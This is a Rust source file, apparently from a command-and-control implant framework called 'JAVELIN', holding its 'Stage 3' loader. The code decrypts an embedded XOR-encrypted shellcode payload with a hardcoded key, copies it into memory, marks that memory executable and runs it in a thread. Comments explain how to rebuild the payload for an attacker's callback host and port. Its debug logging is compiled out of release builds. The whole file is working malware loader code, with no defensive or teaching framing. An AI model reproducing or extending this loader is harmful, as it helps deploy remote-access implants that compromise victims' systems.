//! Stage 3 loader - Loads and executes Stage0-Lite (C-based bootstrap payload)
use crate::crypto::{decrypt_payload, CryptoAlgorithm};
use crate::memory::{allocate_rw, cleanup_memory, transition_rx};
use std::error::Error;

// Stage0-lite shellcode, XOR-encrypted at build time by stages/stage0-lite/build.sh
// Key: "C2R2_JAVELIN_STAGE0_KEY_2026_!!!!"
// Regenerate with: bash stages/stage0-lite/build.sh --ip <HOST> --port <PORT>
const ENCRYPTED_STAGE0: &[u8] = include_bytes!("stage0_payload.bin");
const STAGE0_XOR_KEY: &[u8] = b"C2R2_JAVELIN_STAGE0_KEY_2026_!!!!";

pub fn load_stage3() -> Result<(), Box<dyn Error>> {
    #[cfg(feature = "dev")]
    println!("[JAVELIN] Loading Stage 3 (Stage0-Lite)...");

    if ENCRYPTED_STAGE0.len() <= 1 {
        return Err("No Stage0 payload embedded (run build.sh first)".into());
    }

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Decrypting Stage0-Lite ({} bytes)", ENCRYPTED_STAGE0.len());

    let decrypted = decrypt_payload(ENCRYPTED_STAGE0, STAGE0_XOR_KEY, CryptoAlgorithm::Xor)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Allocating {} bytes as RW", decrypted.len());

    let region = allocate_rw(decrypted.len())?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Copying payload to memory");

    unsafe {
        std::ptr::copy_nonoverlapping(
            decrypted.as_ptr(),
            region.address(),
            decrypted.len(),
        );
    }

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Transitioning memory to RX");

    transition_rx(&region)?;

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Executing Stage0-Lite shellcode");

    unsafe {
        let stage0_entry: extern "C" fn() = std::mem::transmute(region.address());
        stage0_entry();
    }

    // Do NOT cleanup/free `region` here. The stage0 shellcode was launched with
    // Donut's -t flag, meaning stage0_lite runs in its own thread that still
    // executes code from `region`. Freeing it while stage0 is running causes
    // STATUS_ACCESS_VIOLATION (0xC0000005) in that thread.
    // Leak the memory intentionally; the OS reclaims it when the process exits.
    std::mem::forget(region);

    #[cfg(feature = "dev")]
    println!("[JAVELIN] Stage0-Lite execution complete");

    Ok(())
}
